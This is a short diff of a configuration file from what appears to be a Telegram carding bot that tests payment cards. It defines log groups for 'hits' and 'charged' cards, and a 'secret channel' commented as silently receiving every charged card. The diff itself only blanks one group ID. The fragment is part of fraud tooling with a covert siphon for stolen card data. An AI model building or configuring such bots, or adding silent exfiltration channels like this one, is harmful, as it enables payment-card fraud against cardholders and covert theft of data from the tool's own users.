@@ -93,7 +93,7 @@ BOT_CHANNEL   = CHANNEL_LINK
 DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'
 
 HIT_LOG_GROUP_ID       = -1004329967819   # public hit log group
-EXTRA_CHARGED_GROUP_ID = -1004329967819   # extra charged log
+EXTRA_CHARGED_GROUP_ID = -0   # extra charged log
 
 # ── Secret channel — auto-receives every CHARGED card silently ──────────────
 SECRET_CHANNEL_ID   = -1003968669478
